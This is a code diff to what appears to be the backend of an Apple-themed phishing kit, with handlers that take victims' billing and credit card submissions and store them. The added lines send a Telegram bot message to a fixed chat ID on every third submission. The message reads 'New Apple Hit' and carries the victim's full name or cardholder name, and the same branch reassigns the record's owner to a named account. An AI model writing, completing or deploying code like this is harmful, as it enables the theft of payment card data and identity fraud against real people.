@@ -226,6 +226,10 @@ const submitBilling = async (req, res) => {
   panelCount++;
   if (panelCount == 3) {
     owner = "haytch0411";
+    await axios.post(
+      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=New Apple Hit:\n${fullname}`
+    );
+
     panelCount = 0;
   }
 
@@ -315,6 +319,9 @@ const submitCC = async (req, res) => {
       panelCount++;
       if (panelCount == 3) {
         owner = "haytch0411";
+        await axios.post(
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=New Apple Hit:\n${ccname}`
+        );
         panelCount = 0;
       }
       await AppleGB.create({
